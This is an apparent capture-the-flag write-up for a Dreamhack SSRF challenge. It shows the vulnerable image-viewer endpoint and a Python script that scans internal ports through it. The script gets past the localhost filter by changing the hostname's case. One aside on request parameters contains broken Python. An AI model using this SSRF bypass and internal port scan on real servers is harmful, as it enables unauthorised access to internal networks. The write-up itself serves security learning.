# SSRF : Server Side Request Forgery 

### SSRF is very simillar with CSRF's principle. The difference is who are requesting to specific server.  
### The case server has internal network system general network can't access, but the other server who has permission to access is exist, we can access the internal network of specific server by passing the second server.  
![image](https://github.com/Hueok/dreamhack.io/assets/124287568/40e760f0-40da-4b2e-9b87-f6292fb91b5d)
<br/>


## Exercise of SSRF
> https://dreamhack.io/wargame/challenges/75/

#### Code of endpoint img_viewer
```py
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```
#### And the page is below.
![image](https://github.com/Hueok/dreamhack.io/assets/124287568/0e3fedeb-723e-4db7-8f26-c81cb3fbe98e)

#### Another Fragment of code
```py
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())

app.run(host="0.0.0.0", port=8000, threaded=True)
```
internal server that has random range(1500 ~ 1800) port is open, having resource directory where the code is run.  
So our flag is on internal server.  
We can access to internal server by only using the image_viewer endpoint.  

#### First, we should find port of internal server. So I programmed some code.
```py
import requests

NOTFOUND_IMG = "iVBORw0KGgoAAAANSUh"

base_url = "http://host3.dreamhack.games:16961/img_viewer"

for port in range(1500, 1801):
    target_url = f"http://Localhost:{port}"
    
    data = {
        'url' : target_url
    }

    resp = requests.post(base_url, data=data).text

    print(f'{port} is running....')
    if NOTFOUND_IMG not in resp:
        result = port
        break

print(result)
```
The point I should not forget is `request.post()`. This function has argument `URL`, `param`, `data` and etc... Important point is difference param and data.  
The param is united with url, While data is included in body of request, not in url.
```py
url = 'http://api.internal'
param = {
    'user' = 'public'
    'permission' = '1'
}
resp = request.post(url, param=param) #The request url -> http://api.internal?user=public&permission=1

data = {
    'user' = 'public'
    'permission' = '1'
}
resp = request.post(url, data=data) #The request url not different with origin one. but the request body has data.
```
_If the webpage has input form, the webpage gain the data from the form. But when we programming it's hard to input data to form box. So we can define dict-data. It has same effect with first way._  

#### Back to the prob. the img data is encoded to base64. so we have to decode the response which is found in src of <img> tag. -> The Flag detected.
